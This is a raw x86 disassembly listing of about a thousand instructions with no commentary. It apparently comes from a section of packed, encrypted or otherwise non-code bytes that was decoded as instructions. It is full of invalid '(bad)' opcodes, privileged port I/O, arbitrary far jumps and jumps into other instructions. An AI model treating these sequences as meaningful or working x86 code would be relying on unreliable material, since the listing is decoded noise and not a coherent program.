  40bbde:	aad    0x90
  40bbe0:	gs mov cl,0x8e
  40bbe3:	add    eax,0x7e85274a
  40bbe8:	mov    esp,0x77209c6b
  40bbed:	(bad)  
  40bbee:	jne    0x40bc3a
  40bbf0:	inc    edx
  40bbf1:	jbe    0x40bb79
  40bbf3:	scas   al,BYTE PTR es:[edi]
  40bbf4:	cli    
  40bbf5:	mov    ebx,0x3dfb63
  40bbfa:	loop   0x40bc1f
  40bbfc:	aaa    
  40bbfd:	rol    BYTE PTR [eax+0x37b20e43],cl
  40bc03:	mov    bx,0xd4ca
  40bc07:	mov    ecx,0x4464f6fd
  40bc0c:	(bad)  
  40bc0d:	out    dx,al
  40bc0e:	sbb    DWORD PTR [edx+0x8],ecx
  40bc11:	sub    al,0xac
  40bc13:	sbb    eax,0x829d33b6
  40bc18:	(bad)  
  40bc19:	pop    edi
  40bc1a:	loope  0x40bc1a
  40bc1c:	stos   BYTE PTR es:[edi],al
  40bc1d:	and    eax,0x645ff16e
  40bc22:	sbb    DWORD PTR [esp-0x7f085f3e],ebx
  40bc29:	ins    BYTE PTR es:[edi],dx
  40bc2a:	gs loope 0x40bc92
  40bc2d:	mov    edi,0x308d284
  40bc32:	outs   dx,BYTE PTR ds:[esi]
  40bc33:	sub    DWORD PTR [edi+0x648e0194],edx
  40bc39:	(bad)  
  40bc3a:	pop    esi
  40bc3b:	cmp    DWORD PTR [edi-0x2b611e26],edi
  40bc41:	nop
  40bc42:	jae    0x40bc0e
  40bc44:	jp     0x40bc70
  40bc46:	xor    ebx,DWORD PTR [ecx-0x2a0a2bca]
  40bc4c:	bound  ecx,QWORD PTR [eax]
  40bc4e:	test   BYTE PTR [ecx],0x4
  40bc51:	ds dec ebx
  40bc53:	mov    ah,0x94
  40bc55:	out    dx,eax
  40bc56:	pop    edi
  40bc57:	(bad)  
  40bc58:	jge    0x40bc45
  40bc5a:	ins    BYTE PTR es:[edi],dx
  40bc5b:	push   ds
  40bc5c:	push   cs
  40bc5d:	cmc    
  40bc5e:	push   0x5b50108c
  40bc63:	dec    edx
  40bc64:	and    esp,DWORD PTR [edi+0x175f3e19]
  40bc6a:	cdq    
  40bc6b:	mov    dl,0xf0
  40bc6d:	add    edi,DWORD PTR [ebp+0x75438d93]
  40bc73:	pop    ebp
  40bc74:	pop    ebp
  40bc75:	nop
  40bc76:	pop    ecx
  40bc77:	mov    esp,0x160c9fea
  40bc7c:	int    0x80
  40bc7e:	xlat   BYTE PTR ds:[ebx]
  40bc7f:	mov    esp,0xd8bc5d4
  40bc84:	sbb    al,0x97
  40bc86:	ja     0x40bcca
  40bc88:	pop    esp
  40bc89:	lock pop eax
  40bc8b:	inc    ebx
  40bc8c:	not    DWORD PTR [ebx]
  40bc8e:	lea    eax,[ebp-0x7]
  40bc91:	push   es
  40bc92:	je     0x40bc28
  40bc94:	pop    edi
  40bc95:	add    ch,BYTE PTR [ecx]
  40bc97:	adc    eax,0xf6b53585
  40bc9c:	xchg   ecx,eax
  40bc9d:	lods   al,BYTE PTR ds:[esi]
  40bc9e:	jbe    0x40bd13
  40bca0:	not    BYTE PTR [eax+esi*1+0x6a]
  40bca4:	int    0xf4
  40bca6:	inc    ebx
  40bca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca8:	pop    eax
  40bca9:	popf   
  40bcaa:	or     BYTE PTR [ebx-0x30679b09],dl
  40bcb0:	xor    dl,BYTE PTR ds:0x8bbd6649
  40bcb6:	dec    edi
  40bcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb8:	and    edi,eax
  40bcba:	lods   al,BYTE PTR ds:[esi]
  40bcbb:	xchg   DWORD PTR [eax],ebp
  40bcbd:	dec    eax
  40bcbe:	ins    DWORD PTR es:[edi],dx
  40bcbf:	fld    QWORD PTR [eax+0x4b]
  40bcc2:	xlat   BYTE PTR ds:[ebx]
  40bcc3:	lods   eax,DWORD PTR ds:[esi]
  40bcc4:	lods   al,BYTE PTR ds:[esi]
  40bcc5:	adc    DWORD PTR [ebp-0x1c],0xe20ec464
  40bccc:	jnp    0x40bc89
  40bcce:	in     al,dx
  40bccf:	ret    0xf38
  40bcd2:	and    DWORD PTR [edi],ecx
  40bcd4:	data16 and bl,BYTE PTR es:[esi]
  40bcd8:	push   ecx
  40bcd9:	inc    ecx
  40bcda:	sti    
  40bcdb:	or     al,0x68
  40bcdd:	ret    
  40bcde:	ds push ebx
  40bce0:	cmp    cl,BYTE PTR es:[edx-0x12]
  40bce4:	pop    eax
  40bce5:	fisub  DWORD PTR [esi-0x51916e7a]
  40bceb:	sub    edx,DWORD PTR [ecx+0x72]
  40bcee:	sub    eax,0xcb923fed
  40bcf3:	jmp    0xb94d:0xd295bb6d
  40bcfa:	les    ecx,FWORD PTR [edx-0x395bcae9]
  40bd00:	or     DWORD PTR [edi+ecx*8+0x5e],esp
  40bd04:	sbb    al,0xb6
  40bd06:	(bad)  
  40bd07:	xlat   BYTE PTR ds:[ebx]
  40bd08:	call   0x5126:0x6e40dc4d
  40bd0f:	aad    0x78
  40bd11:	loop   0x40bd7c
  40bd13:	fadd   DWORD PTR [edx-0x4f]
  40bd16:	popa   
  40bd17:	xchg   BYTE PTR [ecx],dl
  40bd19:	mov    ds:0xaf39945c,eax
  40bd1e:	or     cl,BYTE PTR [esi+0x45]
  40bd21:	xor    BYTE PTR [ecx+0x65],0xff
  40bd25:	push   cs
  40bd26:	out    0xbd,al
  40bd28:	les    ebx,FWORD PTR [ebx-0xe]
  40bd2b:	xlat   BYTE PTR ds:[ebx]
  40bd2c:	mov    ds:0xc1e05520,eax
  40bd31:	clc    
  40bd32:	(bad)  
  40bd33:	sbb    dl,ch
  40bd35:	jecxz  0x40bda2
  40bd37:	repz push ebx
  40bd39:	retf   0x968f
  40bd3c:	(bad)  ds:0xd2b28e87
  40bd42:	lahf   
  40bd43:	dec    ebp
  40bd44:	cmp    al,0xba
  40bd46:	(bad)  
  40bd47:	jmp    0xff3d:0x659046d0
  40bd4e:	dec    edi
  40bd4f:	loope  0x40bd32
  40bd51:	dec    esp
  40bd52:	add    eax,0x457e4d02
  40bd57:	mov    bh,0xd1
  40bd59:	cwde   
  40bd5a:	add    cl,BYTE PTR [edi+eiz*1]
  40bd5d:	sbb    DWORD PTR [eax+0x12],eax
  40bd60:	cmp    eax,0xe6a4a371
  40bd65:	test   al,0x99
  40bd67:	sbb    BYTE PTR [edx-0x59],bl
  40bd6a:	cmc    
  40bd6b:	gs xchg esp,eax
  40bd6d:	cld    
  40bd6e:	ret    
  40bd6f:	cmp    eax,0x4fd68895
  40bd74:	sub    al,0xd5
  40bd76:	inc    edi
  40bd77:	loope  0x40bd47
  40bd79:	mov    BYTE PTR [ecx+0x52],bh
  40bd7c:	pop    ss
  40bd7d:	mov    dl,0x2f
  40bd7f:	xchg   esi,eax
  40bd80:	cmp    edi,0x12
  40bd83:	inc    ecx
  40bd84:	adc    ebx,ecx
  40bd86:	sub    esp,DWORD PTR ds:0x5d02d78d
  40bd8c:	xor    dl,bh
  40bd8e:	cdq    
  40bd8f:	lods   eax,DWORD PTR ds:[esi]
  40bd90:	push   gs
  40bd92:	stc    
  40bd93:	mov    DWORD PTR cs:[edx+0x4c18758b],esi
  40bd9a:	adc    al,0xfd
  40bd9c:	jae    0x40bd57
  40bd9e:	shl    BYTE PTR [ebx],0xce
  40bda1:	xchg   ebp,eax
  40bda2:	pop    edi
  40bda3:	iret   
  40bda4:	shl    BYTE PTR [esi-0x4d],0xc9
  40bda8:	aaa    
  40bda9:	jle    0x40bd42
  40bdab:	xor    bh,ch
  40bdad:	std    
  40bdae:	in     al,0x79
  40bdb0:	xchg   esp,eax
  40bdb1:	adc    edi,DWORD PTR [eax+0x23b1dba9]
  40bdb7:	in     eax,dx
  40bdb8:	div    DWORD PTR [esp+ebp*4-0x56]
  40bdbc:	push   ss
  40bdbd:	cmc    
  40bdbe:	fmul   DWORD PTR [eax]
  40bdc0:	sub    al,0x72
  40bdc2:	add    al,0x9b
  40bdc4:	or     eax,0x9fecea09
  40bdc9:	jne    0x40be00
  40bdcb:	int3   
  40bdcc:	fisubr WORD PTR [ebx-0x540f7102]
  40bdd2:	jnp    0x40be41
  40bdd4:	sub    al,0x6a
  40bdd6:	stos   BYTE PTR es:[edi],al
  40bdd7:	mov    edx,0xae0e2540
  40bddc:	aaa    
  40bddd:	mov    eax,0x456da79f
  40bde2:	push   ebp
  40bde3:	outs   dx,DWORD PTR ds:[esi]
  40bde4:	add    bh,BYTE PTR [edi+0x278e0afe]
  40bdea:	daa    
  40bdeb:	sub    BYTE PTR [ebx-0x1177e3e2],cl
  40bdf1:	daa    
  40bdf2:	jecxz  0x40bd9b
  40bdf4:	test   eax,0x39d9d4e4
  40bdf9:	das    
  40bdfa:	inc    ebx
  40bdfb:	inc    ecx
  40bdfc:	test   al,ch
  40bdfe:	daa    
  40bdff:	leave  
  40be00:	push   0x61ba1dc9
  40be05:	sbb    DWORD PTR [esi+0x4fd15b44],edi
  40be0b:	lahf   
  40be0c:	jecxz  0x40be72
  40be0e:	enter  0xbe37,0xf4
  40be12:	pop    edi
  40be13:	(bad)  
  40be14:	fcomip st,st(6)
  40be16:	inc    ebp
  40be17:	inc    esi
  40be18:	cmp    esp,edi
  40be1a:	xchg   esp,eax
  40be1b:	lds    edi,FWORD PTR [esi+eiz*4+0x7ba0f0ef]
  40be22:	out    dx,eax
  40be23:	sub    ebp,ebp
  40be25:	and    DWORD PTR [ebx-0x5efa0e5b],ecx
  40be2b:	inc    ebx
  40be2c:	clc    
  40be2d:	jp     0x40be4d
  40be2f:	clc    
  40be30:	ss push ecx
  40be32:	lods   al,BYTE PTR ds:[esi]
  40be33:	jp     0x40bdb9
  40be35:	and    esp,DWORD PTR [eax-0x52]
  40be38:	sub    ecx,DWORD PTR [edi-0x41747e28]
  40be3e:	mul    ah
  40be40:	data16 adc al,0xb7
  40be43:	push   esi
  40be44:	dec    ebp
  40be45:	cmp    DWORD PTR [edx-0x17dfa59d],ecx
  40be4b:	xor    eax,ebp
  40be4d:	push   esp
  40be4e:	and    eax,0x9d3c71bb
  40be53:	call   0xaf0e:0x93da2873
  40be5a:	ds (bad) 
  40be5c:	lock adc al,0xb
  40be5f:	cmp    eax,0x834d6373
  40be64:	mov    ebp,0x4bed0df6
  40be69:	jae    0x40be72
  40be6b:	mov    bl,0xae
  40be6d:	mov    dh,0x74
  40be6f:	cmp    ecx,DWORD PTR fs:0x31bec5ae
  40be76:	pop    edi
  40be77:	pop    es
  40be78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be79:	and    DWORD PTR [esi-0x4e],edx
  40be7c:	mov    edx,0xc8cb30b3
  40be81:	cmp    DWORD PTR [edi+ebx*1],0xc775c407
  40be88:	sbb    esi,DWORD PTR [esi-0x75]
  40be8b:	mov    edx,0x40f35985
  40be90:	mov    ebx,0xe7cf3fbd
  40be95:	push   edi
  40be96:	cli    
  40be97:	ror    al,0x88
  40be9a:	xor    al,al
  40be9c:	scas   eax,DWORD PTR es:[edi]
  40be9d:	or     BYTE PTR [esi+0x752c5226],0xb8
  40bea4:	cmc    
  40bea5:	dec    ecx
  40bea6:	popa   
  40bea7:	(bad)  
  40bea8:	adc    eax,0xda42cabf
  40bead:	xchg   ecx,eax
  40beae:	cdq    
  40beaf:	push   cs
  40beb0:	ins    BYTE PTR es:[edi],dx
  40beb1:	and    esi,DWORD PTR [ebx-0x44]
  40beb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb5:	push   ss
  40beb6:	push   ebp
  40beb7:	clc    
  40beb8:	jb     0x40bebf
  40beba:	sar    BYTE PTR [esi*2-0x14a1d71f],1
  40bec1:	(bad)  
  40bec3:	xchg   esi,eax
  40bec4:	repz cmp dh,BYTE PTR [ecx-0x398b4124]
  40becb:	ficom  WORD PTR [edi-0x64]
  40bece:	repz fxch st(7)
  40bed1:	cdq    
  40bed2:	lods   eax,DWORD PTR ds:[esi]
  40bed3:	push   ebp
  40bed4:	sub    esi,DWORD PTR [edx]
  40bed6:	jp     0x40be6a
  40bed8:	xor    al,0x85
  40beda:	arpl   ax,si
  40bedc:	sbb    esi,esp
  40bede:	and    DWORD PTR [esi+edi*1],0xf8ac4bef
  40bee5:	ror    DWORD PTR [edi+ebp*1-0x3ce46648],1
  40beec:	mov    ebp,0x3212021
  40bef1:	mov    WORD PTR [edx+0x72],gs
  40bef4:	add    ah,bl
  40bef6:	out    dx,al
  40bef7:	test   BYTE PTR [eax-0x7f],ch
  40befa:	jp     0x40bf14
  40befc:	mov    WORD PTR ss:[ecx],?
  40beff:	xchg   ebx,eax
  40bf00:	mov    ecx,0x3f558133
  40bf05:	sbb    BYTE PTR [ecx+edx*4+0x7a],bl
  40bf09:	in     eax,dx
  40bf0a:	push   0xcb5d06be
  40bf0f:	rcr    bh,1
  40bf11:	jno    0x40bedc
  40bf13:	mov    edx,0xb0e72aa7
  40bf18:	jp     0x40bee5
  40bf1a:	dec    ecx
  40bf1b:	mov    ds:0xae5d5b96,eax
  40bf20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf21:	cmp    al,bh
  40bf23:	hlt    
  40bf24:	push   esp
  40bf25:	sbb    eax,0x273c9643
  40bf2a:	shl    dl,cl
  40bf2c:	or     DWORD PTR [edi-0x6a],0xfad8b93d
  40bf33:	cmp    al,0x2
  40bf35:	pop    ebp
  40bf36:	fisub  WORD PTR es:[edx+0x7b]
  40bf3a:	fnsave [esi+esi*2]
  40bf3d:	mov    ds:0x80716f5,eax
  40bf42:	repz xor esi,DWORD PTR ds:0x82882572
  40bf49:	push   cs
  40bf4a:	and    al,0x89
  40bf4c:	xchg   ebx,eax
  40bf4d:	and    al,0x3a
  40bf4f:	pcmpeqd mm2,mm3
  40bf52:	xlat   BYTE PTR ds:[ebx]
  40bf53:	push   ecx
  40bf54:	test   edx,esi
  40bf56:	in     eax,0xb1
  40bf58:	fdiv   DWORD PTR [ebp+0x49]
  40bf5b:	pop    esi
  40bf5c:	adc    BYTE PTR [ecx-0x13],cl
  40bf5f:	(bad)  
  40bf60:	cmc    
  40bf61:	adc    esp,ebp
  40bf63:	mov    al,ds:0xe9132522
  40bf68:	cs pop ecx
  40bf6a:	sti    
  40bf6b:	sub    al,BYTE PTR [ebx]
  40bf6d:	and    esi,ecx
  40bf6f:	inc    esp
  40bf70:	jge    0x40bf5c
  40bf72:	cs in  al,0x58
  40bf75:	push   edx
  40bf76:	out    0x24,eax
  40bf78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf79:	jmp    0x74e2500f
  40bf7e:	push   esi
  40bf7f:	mov    al,ds:0xefc7be6f
  40bf84:	in     al,dx
  40bf85:	inc    ecx
  40bf86:	and    dl,BYTE PTR [ebp-0x7669250e]
  40bf8c:	(bad)  
  40bf8d:	push   esp
  40bf8e:	(bad)  
  40bf8f:	push   ebp
  40bf90:	sti    
  40bf91:	and    edi,ecx
  40bf93:	out    dx,al
  40bf94:	dec    eax
  40bf95:	ins    BYTE PTR es:[edi],dx
  40bf96:	or     BYTE PTR [edx-0x5c20767c],ch
  40bf9c:	test   BYTE PTR [ebp-0x6bc6d1de],dh
  40bfa2:	lds    ebx,FWORD PTR [esi]
  40bfa4:	daa    
  40bfa5:	je     0x40bfa5
  40bfa7:	pop    es
  40bfa8:	xlat   BYTE PTR ds:[ebx]
  40bfa9:	jge    0x40bfa6
  40bfab:	lods   al,BYTE PTR ds:[esi]
  40bfac:	push   ebx
  40bfad:	stos   DWORD PTR es:[edi],eax
  40bfae:	ss pop eax
  40bfb0:	cmp    ebx,edi
  40bfb2:	cs cmp dl,dl
  40bfb5:	inc    edi
  40bfb6:	(bad)  
  40bfb8:	sub    ecx,edx
  40bfba:	jecxz  0x40c004
  40bfbc:	cwde   
  40bfbd:	push   es
  40bfbe:	sbb    DWORD PTR [edi-0xf85a677],edi
  40bfc4:	adc    BYTE PTR [edi-0x7c0a7646],bl
  40bfca:	gs mov dl,0x2a
  40bfcd:	outs   dx,DWORD PTR ds:[esi]
  40bfce:	add    bh,cl
  40bfd0:	pop    edx
  40bfd1:	enter  0x8134,0x33
  40bfd5:	and    ax,0xcd40
  40bfd9:	in     eax,dx
  40bfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfdb:	mov    dh,0x6
  40bfdd:	rcl    BYTE PTR [esi+0x7907a735],0xb4
  40bfe4:	iret   
  40bfe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfe6:	ins    BYTE PTR es:[edi],dx
  40bfe7:	dec    DWORD PTR [ecx+0x67c99089]
  40bfed:	fldenv [eax-0x4e95f272]
  40bff3:	push   cs
  40bff4:	push   ss
  40bff5:	scas   al,BYTE PTR es:[edi]
  40bff6:	aam    0x9a
  40bff8:	and    BYTE PTR [ebp+0x12],al
  40bffb:	xchg   edi,eax
  40bffc:	test   eax,0x11072482
  40c001:	jg     0x40bf9a
  40c003:	loope  0x40bfc2
  40c005:	fnstsw WORD PTR [esi]
  40c007:	pop    ebp
  40c008:	dec    ebp
  40c009:	jmp    0x7ca77d03
  40c00e:	stos   DWORD PTR es:[di],eax
  40c010:	repnz sub al,0xf2
  40c013:	neg    BYTE PTR [ecx+0xd7abb09]
  40c019:	sbb    eax,0x924cfb37
  40c01e:	push   edi
  40c01f:	les    ebp,FWORD PTR [edi]
  40c021:	lods   eax,DWORD PTR ds:[esi]
  40c022:	or     al,0x70
  40c024:	pop    ebx
  40c025:	loope  0x40c037
  40c027:	and    edi,DWORD PTR [ebx+0x37d1bedd]
  40c02d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c02e:	test   cl,dh
  40c030:	sbb    al,BYTE PTR [ebx]
  40c032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c033:	adc    DWORD PTR [eax],ecx
  40c035:	dec    ecx
  40c036:	das    
  40c037:	stos   BYTE PTR es:[edi],al
  40c038:	loop   0x40c032
  40c03a:	jno    0x40bfe2
  40c03c:	cwde   
  40c03d:	add    al,0x7d
  40c03f:	jge    0x40c03d
  40c041:	call   0x6935:0xa86eee08
  40c048:	lds    edx,FWORD PTR [edx+0x5727e0d4]
  40c04e:	mov    edx,0x72ec57a
  40c053:	fild   QWORD PTR [eax]
  40c055:	(bad)  
  40c056:	xchg   esp,eax
  40c057:	cmp    ebp,ecx
  40c059:	pmullw mm2,mm4
  40c05c:	mov    cl,0xec
  40c05e:	mov    al,0xe2
  40c060:	in     eax,dx
  40c061:	push   0x92da22ca
  40c066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c067:	xchg   esp,eax
  40c068:	inc    ecx
  40c069:	xor    al,0x13
  40c06b:	shr    BYTE PTR [ebx-0x60],1
  40c06e:	data16 xchg dl,cl
  40c071:	or     BYTE PTR ss:[ebx],dh
  40c074:	sti    
  40c075:	out    dx,eax
  40c076:	out    0xa8,eax
  40c078:	std    
  40c079:	pop    esp
  40c07a:	push   esp
  40c07b:	xchg   ch,ah
  40c07d:	imul   esp,DWORD PTR [edi+eax*2+0x23],0x9
  40c082:	jnp    0x40c079
  40c084:	push   esp
  40c085:	loopne 0x40c0d3
  40c087:	(bad)  
  40c088:	jns    0x40c05e
  40c08a:	(bad)  
  40c08b:	sub    bh,dl
  40c08d:	dec    ebx
  40c08e:	mov    dh,0x66
  40c090:	dec    ecx
  40c091:	push   ss
  40c092:	or     BYTE PTR [ecx+ebp*2+0x3cdcab41],ah
  40c099:	xor    eax,0x919c211b
  40c09e:	and    eax,DWORD PTR [edx+0x9]
  40c0a1:	or     eax,0x89e33e6a
  40c0a6:	push   ebp
  40c0a7:	or     ah,bh
  40c0a9:	jo     0x40c0b5
  40c0ab:	or     al,0x60
  40c0ad:	ds (bad) 
  40c0af:	pop    edi
  40c0b0:	jbe    0x40c050
  40c0b2:	and    al,0x9d
  40c0b4:	jnp    0x40c0ab
  40c0b6:	push   ebp
  40c0b7:	test   DWORD PTR ds:0x7913c305,esp
  40c0bd:	dec    edi
  40c0be:	inc    eax
  40c0bf:	aaa    
  40c0c0:	xchg   esp,eax
  40c0c1:	adc    DWORD PTR [ecx+0x63],ecx
  40c0c4:	stos   BYTE PTR es:[edi],al
  40c0c5:	popa   
  40c0c6:	push   es
  40c0c7:	test   DWORD PTR ds:[edi-0x66],esi
  40c0cb:	clc    
  40c0cc:	jae    0x40c135
  40c0ce:	inc    ebp
  40c0cf:	adc    esp,DWORD PTR [edi+0x70017e21]
  40c0d5:	loopne 0x40c143
  40c0d7:	push   0xffffffa3
  40c0d9:	push   esp
  40c0da:	aas    
  40c0db:	mov    edi,0xb5c89609
  40c0e0:	add    edi,DWORD PTR ds:0xe12f6b33
  40c0e6:	lahf   
  40c0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0e8:	jno    0x40c0b5
  40c0ea:	jo     0x40c07d
  40c0ec:	in     al,0xc3
  40c0ee:	test   al,0xec
  40c0f0:	icebp  
  40c0f1:	mov    ebx,0x21c8cd2b
  40c0f6:	into   
  40c0f7:	cmp    al,0x37
  40c0f9:	cwde   
  40c0fa:	lods   al,BYTE PTR ds:[esi]
  40c0fb:	imul   ebx,DWORD PTR [edi-0x54942a6],0x23
  40c102:	into   
  40c103:	cs add eax,0xd25d5435
  40c109:	les    ecx,FWORD PTR cs:[edx+0x15]
  40c10d:	and    al,bl
  40c10f:	add    eax,DWORD PTR ds:0xf180e273
  40c115:	adc    al,0x44
  40c117:	test   al,0xa2
  40c119:	popf   
  40c11a:	outs   dx,BYTE PTR ds:[esi]
  40c11b:	mov    ah,0xc8
  40c11d:	je     0x40c14d
  40c11f:	outs   dx,BYTE PTR ds:[esi]
  40c120:	mov    esp,0xb2147666
  40c125:	mov    ebp,0x354a0676
  40c12a:	out    dx,eax
  40c12b:	test   eax,0x3a313895
  40c130:	jb     0x40c150
  40c132:	cdq    
  40c133:	or     al,0xaa
  40c135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c136:	test   DWORD PTR [ebx+0x48],0xc44f55bd
  40c13d:	bound  edx,QWORD PTR [eax]
  40c13f:	das    
  40c140:	bound  ecx,QWORD PTR [edx]
  40c142:	add    ebp,esi
  40c144:	lods   al,BYTE PTR ds:[esi]
  40c145:	push   0xeaed28cc
  40c14a:	add    eax,0x640e6c0c
  40c14f:	in     al,dx
  40c150:	xchg   edi,eax
  40c151:	in     al,0x1
  40c153:	outs   dx,BYTE PTR ds:[esi]
  40c154:	repz inc edi
  40c156:	fcom   QWORD PTR [eax]
  40c158:	pop    ebp
  40c159:	dec    edi
  40c15a:	setnp  BYTE PTR [ebx]
  40c15d:	rol    DWORD PTR [ebp-0x48],0x51
  40c161:	mov    esp,0xb7a439b6
  40c166:	adc    DWORD PTR [ecx+0x6e69bf72],ebx
  40c16c:	std    
  40c16d:	call   0xa33e4937
  40c172:	mov    al,0x2c
  40c174:	ins    DWORD PTR es:[edi],dx
  40c175:	jmp    0x40c15d
  40c177:	adc    eax,0x69f89c60
  40c17c:	fcomip st,st(3)
  40c17e:	inc    esi
  40c17f:	loopne 0x40c189
  40c181:	popa   
  40c182:	sub    al,bh
  40c184:	leave  
  40c185:	jnp    0x40c1e1
  40c187:	xchg   ecx,eax
  40c188:	and    eax,0x8b554e5f
  40c18d:	cmp    eax,0x67b7b7e5
  40c192:	mov    gs,WORD PTR [ebx-0x48]
  40c195:	dec    esp
  40c196:	arpl   si,si
  40c198:	jge    0x40c1a4
  40c19a:	mov    esp,0x94709da5
  40c19f:	xor    eax,0xf15c53fb
  40c1a4:	xchg   ebp,eax
  40c1a5:	jge    0x40c1ab
  40c1a7:	daa    
  40c1a8:	icebp  
  40c1a9:	test   dh,ch
  40c1ab:	and    bl,BYTE PTR [ecx+ebp*1+0x4f]
  40c1af:	in     eax,dx
  40c1b0:	aaa    
  40c1b1:	jmp    0x40c186
  40c1b3:	mov    al,0xf3
  40c1b5:	ds stos DWORD PTR es:[edi],eax
  40c1b7:	outs   dx,BYTE PTR ds:[esi]
  40c1b8:	sub    BYTE PTR [ebx+0x7ed359e7],0xd
  40c1bf:	inc    eax
  40c1c0:	adc    BYTE PTR [edi+0x14e5bbf4],ch
  40c1c6:	hlt    
  40c1c7:	out    0xf,al
  40c1c9:	push   0x995490d0
  40c1ce:	(bad)  
  40c1cf:	aad    0xd3
  40c1d1:	xor    al,0x81
  40c1d3:	push   edi
  40c1d4:	sbb    BYTE PTR [edi-0x414805d1],ah
  40c1da:	cld    
  40c1db:	mov    eax,ds:0xe3f6c3a5
  40c1e0:	ror    BYTE PTR [eax+0x60e46bd1],1
  40c1e6:	pop    edx
  40c1e7:	mov    eax,0x73c617d1
  40c1ec:	and    ecx,DWORD PTR [edx]
  40c1ee:	inc    esp
  40c1ef:	ja     0x40c194
  40c1f1:	(bad)  
  40c1f2:	cmp    eax,0xd89e6536
  40c1f7:	and    cl,dl
  40c1f9:	mov    dh,0xc2
  40c1fb:	jns    0x40c20a
  40c1fd:	mov    ecx,0xc6fb6f5a
  40c202:	xor    ebp,DWORD PTR [ecx]
  40c204:	clc    
  40c205:	stc    
  40c206:	std    
  40c207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c208:	mov    eax,0xdd0e8f53
  40c20d:	rcr    DWORD PTR [eax+0x56],cl
  40c210:	push   cs
  40c211:	dec    ebx
  40c212:	inc    ebx
  40c213:	push   edx
  40c214:	mov    ebx,0x814c8f50
  40c219:	xor    DWORD PTR [ebx],ebp
  40c21b:	mov    edx,0x4a32a848
  40c220:	mov    eax,ds:0xc215c8ee
  40c225:	pop    ss
  40c226:	cld    
  40c227:	dec    eax
  40c228:	nop
  40c229:	jno    0x40c25d
  40c22b:	jge    0x40c1d8
  40c22d:	mov    ecx,0x8197f748
  40c232:	sub    eax,0xdf2f6f57
  40c237:	inc    eax
  40c238:	in     eax,0x2b
  40c23a:	shr    BYTE PTR [edx-0x388efbbd],0x2
  40c241:	pop    edi
  40c242:	mov    esi,0x7783e9ad
  40c247:	scas   eax,DWORD PTR es:[edi]
  40c248:	inc    ecx
  40c249:	mov    dh,0xc0
  40c24b:	jecxz  0x40c2b3
  40c24d:	xor    BYTE PTR ds:0xfe704ecd,0x20
  40c254:	mov    edx,ebx
  40c256:	dec    ebx
  40c257:	mov    cl,0xfa
  40c259:	mov    edx,ebp
  40c25b:	jbe    0x40c2d2
  40c25d:	xlat   BYTE PTR ds:[ebx]
  40c25e:	sub    eax,0x62f27f3e
  40c263:	dec    ebp
  40c264:	push   es
  40c265:	test   al,0x49
  40c267:	test   BYTE PTR [ebp-0x3c],ah
  40c26a:	repnz push eax
  40c26c:	ror    edi,1
  40c26e:	sbb    esi,ecx
  40c270:	xchg   ebp,eax
  40c271:	aas    
  40c272:	fdecstp 
  40c274:	rcl    BYTE PTR [ebp-0x56],cl
  40c277:	mov    edi,0x103289f
  40c27c:	dec    eax
  40c27d:	push   0x113a9257
  40c282:	mov    cl,0x3c
  40c284:	dec    edx
  40c285:	or     al,0x61
  40c287:	push   esi
  40c288:	int3   
  40c289:	mov    ds:0x2eee7ed1,eax
  40c28e:	add    al,0xb
  40c290:	adc    BYTE PTR [edi+0x3b],cl
  40c293:	out    dx,al
  40c294:	cmc    
  40c295:	mov    bl,0xba
  40c297:	xchg   edx,eax
  40c298:	rol    esp,0xbd
  40c29b:	sahf   
  40c29c:	jecxz  0x40c227
  40c29e:	cdq    
  40c29f:	pop    ds
  40c2a0:	jb     0x40c2ef
  40c2a2:	sbb    esi,DWORD PTR [ebp-0x34e602c4]
  40c2a8:	sub    cl,ah
  40c2aa:	mov    ah,0x92
  40c2ac:	xchg   ecx,eax
  40c2ad:	sar    bh,1
  40c2af:	mov    bl,cl
  40c2b1:	pop    eax
  40c2b2:	xor    eax,0xba61e901
  40c2b7:	pop    ecx
  40c2b8:	sbb    DWORD PTR [esi+0x3f4fd58d],edx
  40c2be:	mov    eax,ss:0x74dc2f52
  40c2c4:	ins    BYTE PTR es:[edi],dx
  40c2c5:	jne    0x40c267
  40c2c7:	outs   dx,DWORD PTR ds:[esi]
  40c2c8:	sub    eax,DWORD PTR [ecx+ebx*1-0x49]
  40c2cc:	(bad)  
  40c2cd:	or     eax,DWORD PTR [esi]
  40c2cf:	xor    BYTE PTR [ebp-0x25b11462],ah
  40c2d5:	jg     0x40c32a
  40c2d7:	das    
  40c2d8:	cmp    ch,BYTE PTR [edi]
  40c2da:	call   ecx
  40c2dc:	mov    esp,0x1f7c454f
  40c2e1:	mov    di,0xffad
  40c2e5:	xor    BYTE PTR [ebx-0x333b139],0xf4
  40c2ec:	adc    eax,0xac01cfa2
  40c2f1:	dec    ebx
  40c2f2:	mov    fs,ebx
  40c2f4:	and    eax,0xf04dfa30
  40c2f9:	lahf   
  40c2fa:	loopne 0x40c2e5
  40c2fc:	dec    edi
  40c2fd:	and    ecx,DWORD PTR ds:[esi+0x7590ca1d]
  40c304:	inc    esi
  40c305:	sub    DWORD PTR [ebp+0x5f4cbf43],ebp
  40c30b:	push   es
  40c30c:	test   ch,bh
  40c30e:	loopne 0x40c348
  40c310:	scas   eax,DWORD PTR es:[edi]
  40c311:	repz xchg ebx,eax
  40c313:	or     esp,DWORD PTR [esi]
  40c315:	sahf   
  40c316:	test   DWORD PTR [ebp+0x46],esi
  40c319:	or     eax,0xc31d75cc
  40c31e:	sub    BYTE PTR [ecx],dh
  40c320:	cdq    
  40c321:	inc    esp
  40c322:	cdq    
  40c323:	(bad)  
  40c324:	push   ebp
  40c325:	and    BYTE PTR [ebx-0x359f1662],bl
  40c32b:	sbb    DWORD PTR [ebx],0xffffffc2
